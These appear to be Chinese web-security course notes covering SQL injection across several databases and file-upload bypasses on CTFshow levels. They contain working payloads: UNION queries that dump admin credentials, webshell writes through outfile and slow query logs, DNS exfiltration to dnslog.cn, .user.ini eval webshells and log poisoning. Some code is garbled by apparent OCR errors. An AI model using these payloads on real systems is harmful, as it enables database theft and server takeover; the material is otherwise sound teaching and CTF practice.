<h1 id="第24天-WEB攻防-通用漏洞-SQL注入-MYSQL跨库-ACCESS偏移"><a href="#第24天-WEB攻防-通用漏洞-SQL注入-MYSQL跨库-ACCESS偏移" class="headerlink" title="第24天 WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移"></a>第24天 WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移</h1><h4 id="知识点：-9"><a href="#知识点：-9" class="headerlink" title="知识点："></a>知识点：</h4><p>1、脚本代码与数据库前置知识<br>2、Acce33数据库注入-简易偏移<br>3、MYSQL数据库注入-简易&amp;权限跨库</p>
<h4 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>-SQL工注入漏洞产生原理分析<br>-SQL工注入漏洞危害利用分析<br>-脚本代码与数据库操作流程<br>-数据库名，表名，列名，数据<br>-数据库类型，数据库用户，用户权限</p>
<p>为了网站和数据库的安全性，MYSQL内置有ROOT最高用户，划分等级，每个用户对应管理<br>一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。<br>MYSQL两种思路：<br>1、非ROOT的注入攻击：常规类的猜解<br>2、RO0T用户的注入攻击：文件读写操作，跨库查询注入等</p>
<p><strong>MYSQL5.0以上版本：自带的数据库名information schema</strong><br><strong>information schema:存储数据库下的数据库名及表名，列名信息的表</strong><br>获取相关数据：<br>l、数据库版本-看是否符合information schemai查询 version()<br>2、数据库用户-看是否符合ROOT型注入攻击 user()<br>3、当前操作系统-看是否支持大小写或文件路径选择 @@version_compile_os()<br>4、数据库名 为后期查询表名和列名做准备 database()<br>ROOT类型攻击-猜解数据，文件读写，跨库查询<br>获取当前数据库下面的表名信息：<br>UNION SELECT table name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.tables where table schema&#x3D;‘syguestbook’<br>获取表名syadminuser的列名信息：<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information_schema.columms where table_name&#x3D;’sy_adminuser’I<br>and table schema&#x3D;‘syguestbook’<br>获取指定数据：<br>UNION SELECT username,password,<br>3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy adminuser<br>跨库注入：实现当前网站跨库查询其他数据库对应网站的数据<br>获取当前mysq1下的所有数据库名<br>UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information_schema.schmata<br>获取数据库名xhcms下的表名信息<br>UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.tables where table_schema&#x3D;‘xhcms’<br>获取数据库名xhcms下的表manage下的列名信息：<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.columns where table_name&#x3D;’manage’and<br>table schema&#x3D;’xhcms<br>获取指定数据：<br>UNI0 N SELECT user,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from xhcms</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演示案例</span><br><span class="line">ASP+Access-简易注入-字典猜解</span><br><span class="line">由于access数据库特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会</span><br><span class="line">出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入。</span><br><span class="line">ASP+Access-偏移注入-报错显示</span><br><span class="line">偏移注入就是解决表名已知，列名未知的情况！</span><br><span class="line">PHP+MYSOL-简易注入-存储特性</span><br><span class="line">使用高权限账户可以对数据库进行读取和写入</span><br><span class="line">PHP+MYSOL-跨库注入-权限属性</span><br><span class="line">使用高权限账户可以实现对mysql其他数据库进行注入</span><br></pre></td></tr></table></figure>

<h1 id="第25天-WEB攻防-通用漏洞-SQL读写注入-MYSQL-MSSQL-PostgreSQL"><a href="#第25天-WEB攻防-通用漏洞-SQL读写注入-MYSQL-MSSQL-PostgreSQL" class="headerlink" title="第25天 WEB攻防-通用漏洞&amp;SQL读写注入&amp;MYSQL&amp;MSSQL&amp;PostgreSQL"></a>第25天 WEB攻防-通用漏洞&amp;SQL读写注入&amp;MYSQL&amp;MSSQL&amp;PostgreSQL</h1><h4 id="知识点：-10"><a href="#知识点：-10" class="headerlink" title="知识点："></a>知识点：</h4><p>1、SQL注入-MYSQL数据库<br>2、SQL注入-MSSQ数据库<br>3、SQL注入-PostgreSQL数据库</p>
<h4 id="演示案例：-6"><a href="#演示案例：-6" class="headerlink" title="演示案例："></a>演示案例：</h4><p>MYSQL-root高权限读写注入<br>PostgreSQL-高权限读写注入<br>MSSQL-sa高权限读写执行注入<br>结尾彩蛋某Q牌违法登陆框注入</p>
<h4 id="详细点：-1"><a href="#详细点：-1" class="headerlink" title="#详细点："></a>#详细点：</h4><p>Access无高权限注入点-只能猜解，还是暴力猜解<br>MYSQL,PostgreSQL,MSSQL高权限注入点-可升级读写执行等<br>读取文件：<br>UNION SELECT1,load file(‘d:w.txt),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>写入文件：<br>UNION SELECT 1,‘xxxx’,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile ‘d:&#x2F;<a href="http://www.txt’/">www.txt’</a><br>-路径获取：phpinfo,报错，字典等<br>-无法写入：secure_fle_priv突破 需要支特SQL执行环境，没有就需要借助      <a href="https://www.cnblogs.com/c1e4r/articles/8902444.html%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">https://www.cnblogs.com/c1e4r/articles/8902444.html参考文章</a><br>phpmyadmin3或能够直接连上对方数据库进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global slow_query_log=1; 启用日志慢记录</span><br><span class="line">set global slow.query.log_fle=‘shelli路径’； 将操作记录写入到执行路径文件</span><br><span class="line">select’&lt;?php eval($_GET[A])?&gt;&#x27;or SLEEP(11); 将后门语句执行写入到慢日志文件</span><br><span class="line">与文件包含中的日志文件包含有所类似</span><br></pre></td></tr></table></figure>

<p>#PostgreSQL-高权限读写注入<br>测列数：<br>order by 4<br>and 1&#x3D;2 union select null,null,null,null<br>测显位：第2,3</p>
<p>and1&#x3D;2 union select’nul’,null,null,null错误<br>and1&#x3D;2 union select null,.‘nul’,null,null正常<br>and 1&#x3D;2 union select null,null,‘null’,nullE<br>and1&#x3D;2 union select null,.null,null,’nul’错误<br>获取信息：<br>and 1&#x3D;2 UNION SELECT null,version(,null,null<br>and 1&#x3D;2 UNION SELECT null,current user,null,null<br>and 1&#x3D;2 union select null,current database（）,null,null<br>获取数据库名：<br>and 1&#x3D;2 union select null,string_agg(datname,),null,null from pg_database</p>
<p>#MSSQL-sa高权限读写执行注入<br>测列数：<br>order by 4<br>and 1&#x3D;2 union all select null.null.null,null<br>测显位：<br>and 1&#x3D;2 union all select null.1.null.null<br>and 1&#x3D;2 union all select null.null,’s’null<br>获取信息：<br>@@version获取版本信息<br>db name(0当前数据库名字<br>user、system_user,current user,user name获取当前用户名<br>@@SERVERNAME获取服务器主机信息<br>and 1&#x3D;2 union all select null,db_name（）,null,null</p>
<h1 id="第27天-WEB攻防-通用漏洞-SQL注入-Tamper脚本-Base64-Json-md5等"><a href="#第27天-WEB攻防-通用漏洞-SQL注入-Tamper脚本-Base64-Json-md5等" class="headerlink" title="第27天 WEB攻防-通用漏洞&amp;SQL注入&amp;Tamper脚本&amp;Base64&amp;Json&amp;md5等"></a>第27天 WEB攻防-通用漏洞&amp;SQL注入&amp;Tamper脚本&amp;Base64&amp;Json&amp;md5等</h1><h4 id="知识点：-11"><a href="#知识点：-11" class="headerlink" title="知识点："></a>知识点：</h4><p>1、数据表现格式类型注入<br>2、字符转义绕过-宽字节注入<br>3、数字&amp;字符&amp;搜索&amp;编码&amp;加应等</p>
<h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="#参考资料："></a>#参考资料：</h5><p>:star:<a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a></p>
<h4 id="演示案例：-7"><a href="#演示案例：-7" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="本地源码数字-字符-搜索-编码-JSON"><a href="#本地源码数字-字符-搜索-编码-JSON" class="headerlink" title="本地源码数字&amp;字符&amp;搜索&amp;编码&amp;JSON"></a>本地源码数字&amp;字符&amp;搜索&amp;编码&amp;JSON</h6><p>数字型 0-9 字符型 a-z中文标点符号加入了单引号（单引号闭合 1‘ and 1&#x3D;1 –+）<br>搜索型 在基础上又加入的通配符（%’闭合）<br>编码型 数据以编码值传递 加密型 数据以加密后的密文去传递（对注入语句进行加解密后代入）<br>格式型 json （单引号闭合 1‘ and 1&#x3D;1 –+） （需要按照类型进行闭合或加解密构造符合数据库查询的条件去输入）<br>数据进行编码接受处理： 发送编码值，对方常会进行解码后带入数据在进行SQL执行<br>在注入的时候，我们也要尝试对注入的Payloadi进行编码后提交<br>#sqlmap在使用时可以判断出注入点类型是否为数字型、搜索型或者字符型，但是对编码型的注入无法自动判断，所以需要引用tamper脚本进行编码 例如对参数进行base64编码的网站进行sql注入测试的时候可以使用 –tamper&#x3D;enbase64.py进行加密</p>
<h6 id="墨者靶场字符转义处理防护-宽字节注入"><a href="#墨者靶场字符转义处理防护-宽字节注入" class="headerlink" title="墨者靶场字符转义处理防护-宽字节注入"></a>墨者靶场字符转义处理防护-宽字节注入</h6><p>网站会对传入的参数进行部分转译，比如：<a href="http://localhost:8081/blog/news.php?gtpl=simple%E2%80%99order">http://localhost:8081/blog/news.php?gtpl=simple’order</a><br>by 17–+ 转译为selectfrom sy_guestbook where gTpl&#x3D;‘simple’ order by17–+ 致使查询失败<br>在构造闭合前输入 %df 会使查询变为selectfrom sy_guestbook where gTpl&#x3D;‘simple♦’ order by 17–+ （方块在此处为2个字节会覆盖此处的\从而实现绕过）<br>在PHP中存在魔术引号开关magic_quotes_gpc，开启后会对传入参数中的 单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线<br>所以在面对宽字节注入是可以使用sqlmap中的–tamper&#x3D;unmagciquotes.py脚本进行绕过</p>
<h6 id="真实WEB-数据编码接受处理-base64注入"><a href="#真实WEB-数据编码接受处理-base64注入" class="headerlink" title="真实WEB-数据编码接受处理-base64注入"></a>真实WEB-数据编码接受处理-base64注入</h6><p>#sqlmap在使用时可以判断出注入点类型是否为数字型、搜索型或者字符型，但是对编码型的注入无法自动判断，所以需要引用tamper脚本进行编码 例如对参数进行base64编码的网站进行sql注入测试的时候可以使用 –tamper&#x3D;enbase64.py进行加密</p>
<p>真实WEB-JSON数据格式&amp;MD5加密数据<br>工具脚本-SQLMAP-脚本Tamper使用指南              ————可以去看看ctfshow的ctf题目，有一小段专题就是讲这个的</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a>    很好的一篇文章，可以熟练掌握sqlmap的使用。</p>
<h1 id="第28天-WEB攻防-通用漏洞-SQL注入-HTTP头XFF-COOKIE-POST清求"><a href="#第28天-WEB攻防-通用漏洞-SQL注入-HTTP头XFF-COOKIE-POST清求" class="headerlink" title="第28天 WEB攻防-通用漏洞&amp;SQL注入&amp;HTTP头XFF&amp;COOKIE&amp;POST清求"></a>第28天 WEB攻防-通用漏洞&amp;SQL注入&amp;HTTP头XFF&amp;COOKIE&amp;POST清求</h1><p>知识点：<br>1、数据请求方式-GET&amp;POST&amp;COOKIE等<br>2、常见功能点请求方式-用户登录&amp;1P记录等<br>3、黑盒白盒注入测试要点-SQLMAP注入参数</p>
<p>补充点：<br>黑盒测试：功能点分析<br>白盒测试：功能点分析&amp;关键代码追踪</p>
<p>1.数据库注入-access mysql mssql oracle mongodb postgresq等<br>2.数培类型注入-数字型字符型搜索型加密型(base64js0n)等<br>3.提交方式注入-get post cookie http头等<br>4查询方式注入-查询增加删测除更新堆叠等<br>5.复杂注入利用-二次注入dnslog注入绕过bypass等</p>
<p>演示案例：<br>GET&amp;POST&amp;COOKIE&amp;SERVER<br>实例黑盒-后台表单登陆框-POST注入<br>实例白盒-ESPCMS-商品购买-COOKIE注入<br>实例白盒-ZZCMS-IP记录功能-HTTP头XFF注入         <a href="https://blog.csdn.net/qq_48511129/article/details/122692991">https://blog.csdn.net/qq_48511129/article/details/122692991</a><br>此处登录失败会从全局变量获取客户端ip–当密码失败次数过多禁止登录–通过抓包修改x-for-word字段绕过</p>
<p>#部分语言接受代码块</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#部分语言接受代码块</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">Sget=<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line">Spost=<span class="variable">$_POST</span>[<span class="string">&#x27;p]:I</span></span><br><span class="line"><span class="string">Scookie=$_COOKIE[&#x27;</span>c<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">Srequest=&amp;_ REQUESTT&#x27;</span>r]:</span><br><span class="line">Shost=S SERVER[<span class="string">&#x27;HTTP HOST];</span></span><br><span class="line"><span class="string">Suser agent=$SERVER[&quot;HTTP USER AGENT].</span></span><br><span class="line"><span class="string">Sip=$SERVER[HTTP X FORWARDED FOR&quot;]:</span></span><br><span class="line"><span class="string">echo $get.&quot;&lt;hr&gt;&quot;</span></span><br><span class="line"><span class="string">echo $post.&quot;&lt;hr&gt;&quot;:</span></span><br><span class="line"><span class="string">echo $cookie.&quot;&lt;hr&gt;&quot;</span></span><br><span class="line"><span class="string">echo $request.&quot;&lt;hr&gt;&quot;:</span></span><br><span class="line"><span class="string">echo $host.&quot;&lt;hr&gt;&quot;;</span></span><br><span class="line"><span class="string">echo $user agent.&quot;&lt;hr&gt;&quot;;</span></span><br><span class="line"><span class="string">echo $ip;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="第29天-WEB攻防-通用漏洞-SQL注入-增删改查-盲注-延时-布尔-报错"><a href="#第29天-WEB攻防-通用漏洞-SQL注入-增删改查-盲注-延时-布尔-报错" class="headerlink" title="第29天 WEB攻防-通用漏洞&amp;SQL注入&amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错"></a>第29天 WEB攻防-通用漏洞&amp;SQL注入&amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错</h1><h4 id="知识点：-12"><a href="#知识点：-12" class="headerlink" title="知识点："></a>知识点：</h4><p>1、明确查间方式注入Payload<br>2、明确查询方式注入产生功能</p>
<p>3、明确SQL言注延时&amp;布尔&amp;报错</p>
<h4 id="详细点：-2"><a href="#详细点：-2" class="headerlink" title="#详细点："></a>#详细点：</h4><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br>此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>我们可以知道盲注分为以下三类：<br>基于布尔的SQL直注逻辑判断<br>regexp,like,ascii,left,ord.mid<br>基于时间的SQL盲注延时判断<br>if,sleep<br>基于报错的SQL盲注报措回显<br>floor,updatexml,extractvalue<br><a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<p>#参考：<br>like ‘ro% #判断0或0.是否成立<br>regexp “xiaod[a-Z]’ #匹配xiaodi及xiaodi.等<br>if(条件，5,0) #条件成立返回5反之返回0<br>sleep(5) #SQL语句延时执行5秒<br>mid(a.b.c) #从位置b开始，载取a字符串的c位<br>substr(a,b,c) #从位置b开始，截取字符串a的c长度<br>left(database0,1),database0 #let(a,b)从左侧截取a的前b位<br>length(database0)&#x3D;8 #判折数据库database(O名的长度<br>ord&#x3D;ascii ascii(X)&#x3D;97 #判新x的asciit码是否等于97</p>
<p>SQL查询方式汪入<br>select insert update delete orderby等</p>
<h4 id="演示案例：-8"><a href="#演示案例：-8" class="headerlink" title="演示案例："></a>演示案例：</h4><p>SQL-盲注&amp;布尔&amp;报错&amp;延时<br>查-select-xhcms-布尔盲注       <a href="https://www.freebuf.com/articles/web/264357.html">https://www.freebuf.com/articles/web/264357.html</a>    ——–xhcms的各种漏洞</p>
<p>插入-insert-xhcms-报错盲注<br>更新-update-xhcms-&#x3D;报错盲注<br>删除-delete-kkcms-延时盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#SQL-盲注&amp;布尔&amp;报措&amp;延时 PHP开发项目输出结果&amp;开启报措</span><br><span class="line">基于延时： /blog/news.php?id=1 and if(1=1,sleep(5),0) 不需要输出</span><br><span class="line">通过if后面的判断语句去猜解信息，比如if(length(database())=1,sleep(5),0)判断数据库长度是否为1，若猜解正确则返回时间延时5秒</span><br><span class="line">基于布尔： /blog/news.php?id=1 and length(database（）=7 需要有数据库输出判断标注</span><br><span class="line">基于报错：/blog/news.php?id=2 and updatexml(1,concat(Ox7e,(SELECT@@version),0x7e).1)</span><br><span class="line">需要有数据库输出报错处理=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">到这里sql注入终于也是结束了，sql注入也是CTF中的很大一考点，基本上每场比赛都有sql的身影。</span><br></pre></td></tr></table></figure>

<h1 id="第30天-WEB攻防-通用漏洞-SQL注入-CTF-二次-堆叠-DNS带外"><a href="#第30天-WEB攻防-通用漏洞-SQL注入-CTF-二次-堆叠-DNS带外" class="headerlink" title="第30天 WEB攻防-通用漏洞&amp;SQL注入&amp;CTF&amp;二次&amp;堆叠&amp;DNS带外"></a>第30天 WEB攻防-通用漏洞&amp;SQL注入&amp;CTF&amp;二次&amp;堆叠&amp;DNS带外</h1><h4 id="知识点：-13"><a href="#知识点：-13" class="headerlink" title="知识点："></a>知识点：</h4><h6 id="1、数据库堆叠注入"><a href="#1、数据库堆叠注入" class="headerlink" title="1、数据库堆叠注入"></a>1、数据库堆叠注入</h6><p>根据数据库类型决定是否支持多条语句执行</p>
<h6 id="2、数据库二次注入"><a href="#2、数据库二次注入" class="headerlink" title="2、数据库二次注入"></a>2、数据库二次注入</h6><p>应用功能逻辑涉及上导致的先写入后组合的注入</p>
<h6 id="3、数据库Dnslog注入"><a href="#3、数据库Dnslog注入" class="headerlink" title="3、数据库Dnslog注入"></a>3、数据库Dnslog注入</h6><p>解决不回显（反向连接），SQL注入，命令执行，SSRF等</p>
<h6 id="4、黑盒模式分析以上"><a href="#4、黑盒模式分析以上" class="headerlink" title="4、黑盒模式分析以上"></a>4、黑盒模式分析以上</h6><p>二次注入：插入后调用显示操作符合        </p>
<p><img src="https://image.3001.net/images/20200921/1600691018_5f689b4a264c5e1261c28.png!small" alt="1600691018_5f689b4a264c5e1261c28.png!small"></p>
<p>堆叠注入：判断注入后直接调多条执行<br>DNS注入：在注入上没太大利用价值，其他还行        <a href="https://blog.csdn.net/qq_45300786/article/details/107764907">https://blog.csdn.net/qq_45300786/article/details/107764907</a>       一种很新的思路，dns外带的</p>
<h4 id="演示案例：-9"><a href="#演示案例：-9" class="headerlink" title="演示案例："></a>演示案例：</h4><p>二次注入-74CMS&amp;网鼎杯2018 Unfinish</p>
<p>堆叠注入-数据库类型&amp;强网杯2019随便注<br>DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</p>
<h6 id="二次注入-74CMS-网鼎杯2018-Unfinish"><a href="#二次注入-74CMS-网鼎杯2018-Unfinish" class="headerlink" title="#二次注入-74CMS&amp;网鼎杯2018 Unfinish"></a>#二次注入-74CMS&amp;网鼎杯2018 Unfinish</h6><p>CTF-I网鼎杯2018 Unfinish<br>CMS-74CMS个人会员中心</p>
<h6 id="堆叠注入数据库类型-强网杯2019随便注"><a href="#堆叠注入数据库类型-强网杯2019随便注" class="headerlink" title="#堆叠注入数据库类型&amp;强网杯2019随便注"></a>#堆叠注入数据库类型&amp;强网杯2019随便注</h6><p>根据数据库类型决定是否支持多条语句执行<br>支持堆叠数据库类型：MYSQL MSSQL Postgresql等<br>‘;show databases;<br>‘;show tables;<br>‘;show columns from&#96;1919810931114514:<br>‘;select flag from ‘1919810931114514’:<br>‘;SeT<br>@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460:p<br>repare execsql from @a;execute execsql;</p>
<h6 id="DNS利用-平台介绍-SQL注入-命令执行等"><a href="#DNS利用-平台介绍-SQL注入-命令执行等" class="headerlink" title="#DNS利用-平台介绍&amp;SQL注入&amp;命令执行等"></a>#DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</h6><p>1.平台<br><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a><br><a href="http://ceve.io/">http://ceve.io</a><br>2.应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：<br>select load file(concat(“‘,(select database（）,.7logee.dnslog.cnllaa’));<br>and (select load_file(concat(&#x2F;&#x2F;,(select database（）),‘.69knl9.dnslog.cn&#x2F;abc’)))<br>命令执行：<br>ping %USERNAME%.7logee.dnslog.cn</p>
<h1 id="第31天-WEB攻防-通用漏洞-文件上传-js验证-mime-user-ini-语言特性"><a href="#第31天-WEB攻防-通用漏洞-文件上传-js验证-mime-user-ini-语言特性" class="headerlink" title="第31天 WEB攻防-通用漏洞&amp;文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性"></a>第31天 WEB攻防-通用漏洞&amp;文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性</h1><h4 id="知识点：-14"><a href="#知识点：-14" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件上传-前端验证<br>2、文件上传-黑白名单<br>3、文件上传user.in妙用<br>4、文件上传-<a href="https://so.csdn.net/so/search?q=PHP%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">PHP语言</a>特性</p>
<h4 id="详细点：-3"><a href="#详细点：-3" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竟争等</p>
<h4 id="本章课程内容："><a href="#本章课程内容：" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="演示案例：-10"><a href="#演示案例：-10" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CTFSHOW文件上传-151到161关卡<br>151关 前端过滤–直接修改前端允许上传的类型绕过<br>152关 前后端同时过滤–修改前端代码允许php文件上传–burp抓包修改content-type为image&#x2F;png绕过<br>153关 前后端过滤同时严格过滤参数–上传.user.ini配置文件并将内容写为auto_prepend_file&#x3D;test.txt–上传写有webshell的文件（可以为text也可以为png）–访问index.php即可反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补充知识：</span><br><span class="line"></span><br><span class="line">配置文件 ：php.ini</span><br><span class="line">配置文件（php.ini）在 PHP 启动时被读取。对于服务器模块版本的 PHP，仅在 web 服务器启动时读取一次。对于 CGI 和</span><br><span class="line">CLI 版本，每次调用都会读取。(PHP: 配置文件 - Manual)</span><br><span class="line">实际上，除了PHP_INI_SYSTEM以外的模式都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</span><br><span class="line">这里就很清楚了，.user.ini实际上就是一个可以由用户”自定义“的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR</span><br><span class="line">、 PHP_INI_USER”的设置。</span><br><span class="line">其中有两个配置，可以用来制造后门：</span><br><span class="line">auto_append_file ; 指定一个文件，自动包含在要执行的文件前。</span><br><span class="line">auto_prepend_file ;指定一个文件，自动包含在要执行的文件后。 使用方法很简单，直接写在.user.ini中：</span><br><span class="line">auto_prepend_file=test.txt</span><br><span class="line">或者</span><br><span class="line">auto_append_file=test.txt</span><br></pre></td></tr></table></figure>

<p>154155关-JS验证+User.ini+短标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?echo &#x27;123&#x27; ?&gt; //前提是开启配置参数short open tags=on &lt;=(表达式）？&gt;</span><br><span class="line">//不需要开启参数设置 &lt;%echo ‘123’;%&gt; / /前提是开启配置参数asp tags=on</span><br><span class="line"></span><br><span class="line">//不需要修改参数开关 user.ini:auto_prepend_file=test.png test.png:&lt;?=eval($_POST[x]);?&gt; 思路：先尝试图片文件（发现验证不通过）--修改前端代码（存在后端验证）--burp修改文件类型--仍提示文件类型错误（尝试上传user.ini文件）--对png文件中的代码进行过滤（会检查文件中&lt;? php ?&gt;）中的php字段--使用不含php字段的代码（比如 :&lt;?=eval($_POST[x]);?&gt;）</span><br></pre></td></tr></table></figure>

<p>156关 JS验证+user.ini+短标签+过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤 []</span><br><span class="line">user.ini:auto_prepend_file=test.png</span><br><span class="line">test png:&lt;?=eval($_POST&#123;x&#125;),?&gt;</span><br></pre></td></tr></table></figure>

<p>157-158-159JS验证+user ini+短标签+过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.ini: auto_prepend_file=test.png</span><br><span class="line">test.png:&lt;?=system(&#x27;tac../fl*&#x27;)?&gt;</span><br><span class="line">test.png:&lt;?=&#x27;tac../fl*&#x27;)?&gt; //使用反引号运算符的效果与函数shell exec(相同 )</span><br><span class="line">test.png:&lt;echo &#x27;tac /var/www/htmlf*?&gt;</span><br></pre></td></tr></table></figure>

<p>160-JS验证+User.ini-短标签+过德</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再过滤严格的情况下，可以采用通过burp将后门代码写入UA头中，然后写入.user.ini配置文件，将日志文件通过文件包含访问，那么在访问png文件时就是访问日志文件，就会显示后门代码从而达到调用的目的</span><br><span class="line">包含默认日志，日志记录UA头，UA头写后门代码</span><br><span class="line">user.ini:auto_prepend_file-test.png</span><br><span class="line">test.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>161-JS验证+User.ni+短标签+过滤+文件头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件头部检测是否为图片格式文件</span><br><span class="line">user ini:GIF89A auto_prepend_file=test.png</span><br><span class="line">test.png:GIF89A &lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补充：主要就是可以去ctfshow上去刷题，上面的题很好，而且这个知识点也是ctf的常考。</span><br></pre></td></tr></table></figure>

<h1 id="第32天-WEB攻防-通用漏洞-文件上传-二次洹染8-htaccess-变异免杀"><a href="#第32天-WEB攻防-通用漏洞-文件上传-二次洹染8-htaccess-变异免杀" class="headerlink" title="第32天 WEB攻防-通用漏洞&amp;文件上传&amp;二次洹染8&amp;htaccess&amp;变异免杀"></a>第32天 WEB攻防-通用漏洞&amp;文件上传&amp;二次洹染8&amp;htaccess&amp;变异免杀</h1><h4 id="知识点：-15"><a href="#知识点：-15" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件上传-二次渣染<br>2、文件上传-简单免杀变异<br>3、文件上传-.htaccess妙用<br>4、文件上传-PHP语言特性</p>
<h4 id="详细点：-4"><a href="#详细点：-4" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渣染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p>
<h4 id="本章课程内容：-1"><a href="#本章课程内容：-1" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全</p>
<p>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="前置："><a href="#前置：" class="headerlink" title="#前置："></a>#前置：</h4><p>后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门</p>
<h4 id="二次渲染判断：-——较难"><a href="#二次渲染判断：-——较难" class="headerlink" title="二次渲染判断：        ——较难"></a>二次渲染判断：        ——较难</h4><p>1、上传前后文件大小不同<br>2、上传后图片返回内容包含明显的二次渲染标志</p>
<h4 id="演示案例：-11"><a href="#演示案例：-11" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CTFSHOW-文件上传-162到170关卡<br>162 突破过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤 . () &#123;&#125; 等</span><br><span class="line">利用远程包含IP转换地址后门调用执行</span><br><span class="line">.user.ini auto_prepend_file=png</span><br><span class="line">png &lt;?=include’http://794750069/&gt;</span><br><span class="line">https://www.bejson.com/convert/ip2int/</span><br></pre></td></tr></table></figure>

<p>163 突破上传刷除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤 . () &#123;&#125;等同时文件被删测除</span><br><span class="line">直接利用user.ini包含远程</span><br><span class="line">auto_prepend_file=http://794750069/</span><br><span class="line">auto_prepend_file=http://794750069/</span><br></pre></td></tr></table></figure>

<p>164 png二次渲染</p>
